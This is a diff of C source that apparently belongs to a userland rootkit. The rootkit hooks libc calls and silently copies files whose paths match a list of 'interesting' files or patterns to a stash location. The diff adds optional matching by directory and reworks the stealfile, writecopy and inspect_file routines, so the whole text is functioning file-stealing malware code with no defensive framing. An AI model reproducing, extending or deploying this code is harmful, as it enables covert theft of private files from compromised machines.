@@ -1,28 +1,63 @@
 int interesting(const char *path){
     char *interesting_file;
-    int v = 0;
+    int interest = 0;
 
     for(int i = 0; i < INTERESTING_FILES_SIZE; i++){
         interesting_file = interesting_files[i];
         if(!strncmp(interesting_file, path, strlen(interesting_file))){
-            v = 1;
+            interest = 1;
             break;
         }
 
         if(!fnmatch(interesting_file, path, FNM_PATHNAME)){
-            v = 1;
+            interest = 1;
             break;
         }
     }
 
-    return v;
+#ifdef DIRECTORIES_TOO
+    char *cwd;
+    if(interest != 1 && ((cwd = getcwd(NULL, 0)) != NULL)){
+        char *interesting_dir,
+             *pathdup,
+             *bname;
+        
+        for(int i = 0; i < INTERESTING_DIRECTORIES_SIZE; i++){
+            interesting_dir = interesting_directories[i];
+
+            if(!strncmp(interesting_dir, cwd, strlen(interesting_dir))){
+                pathdup = strdup(path);
+                bname = basename(pathdup);
+
+                char curpath[strlen(cwd)+strlen(bname)+2];
+                memset(curpath, 0, sizeof(curpath));
+                snprintf(curpath, sizeof(curpath), "%s/%s", cwd, bname);
+                free(pathdup);
+
+                hook(CACCESS);
+                if((long)call(CACCESS, curpath, F_OK) == 0){
+                    interest = 1;
+                    break;
+                }
+            }
+
+            if(!strncmp(interesting_dir, path, strlen(interesting_dir))){
+                interest = 1;
+                break;
+            }
+        }
+        free(cwd);
+    }
+#endif
+
+    return interest;
 }
 
 int writecopy(const char *oldpath, char *newpath, off_t filesize){
     unsigned char *buf;
     FILE *ofp, *nfp;
     size_t n, m;
-    off_t blksize = getablocksize(filesize);
+    off_t blksize;
 
     hook(CFOPEN, CFWRITE);
 
@@ -35,6 +70,7 @@ int writecopy(const char *oldpath, char *newpath, off_t filesize){
         return -1;
     }
 
+    blksize = getablocksize(filesize);
     do{
         buf = malloc(blksize+1);
         memset(buf, 0, blksize+1);
@@ -94,9 +130,10 @@ int stealfile(const char *oldpath, char *filename, char *newpath){
 #ifdef SYMLINK_FALLBACK
     if(astat.st_size > MAX_FILE_SIZE)
         return linkfile(oldpath, newpath);
-#endif
+#else
     if(astat.st_size > MAX_FILE_SIZE)
         return 1;
+#endif
 #endif
 
     memset(&pstat, 0, sizeof(struct stat));
@@ -119,27 +156,16 @@ int stealfile(const char *oldpath, char *filename, char *newpath){
     return -1;
 }
 
-void takefile(const char *path, char *filename){
-    char *newpath;
-    int steal;
+void inspect_file(const char *pathname){
+    char *dupdup   = strdup(pathname),
+         *filename = basename(dupdup),
+         *newpath;
 
-    newpath = getnewpath(filename);
-    steal = stealfile(path, filename, newpath);
-
-    if(steal < 0){
+    if(interesting(pathname) || interesting(filename)){
+        newpath = getnewpath(filename);
+        stealfile(pathname, filename, newpath);
         free(newpath);
-        return;
     }
 
-    if(!not_user(0))
-        chown_path(newpath, readgid());
-    free(newpath);
-}
-
-void inspect_file(const char *pathname){
-    char *dupdup=strdup(pathname);
-    char *filename = basename(dupdup);
-    if(interesting(pathname) || interesting(filename))
-        takefile(pathname, filename);
     free(dupdup);
 }
